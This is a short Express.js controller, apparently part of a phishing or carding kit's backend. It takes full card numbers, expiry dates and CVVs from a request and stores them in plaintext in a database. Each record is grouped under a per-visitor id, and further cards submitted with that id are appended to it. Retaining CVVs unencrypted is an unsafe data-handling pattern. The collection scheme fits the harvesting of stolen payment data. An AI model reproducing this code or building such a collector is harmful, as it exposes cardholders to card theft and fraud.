const Visa1 = require('../models/Visa1');

exports.createVisa1 = async (req, res) => {
  const { cardNumber, expiryDate, cvv, uniqueid } = req.body;

  if (!cardNumber || !expiryDate || !cvv || !uniqueid) {
    return res.status(400).json({ message: 'All fields are required' });
  }

  try {
    let visa1 = await Visa1.findOne({ uniqueid });

    if (visa1) {
      visa1.entries.push({ cardNumber, expiryDate, cvv });
    } else {
      visa1 = new Visa1({
        uniqueid,
        entries: [{ cardNumber, expiryDate, cvv }]
      });
    }

    await visa1.save();

    return res.status(201).json({
      success: true,
      message: 'Visa1 data successfully saved'
    });
  } catch (error) {
    console.error(error);
    return res.status(500).json({
      success: false,
      message: 'Server error, please try again later'
    });
  }
};
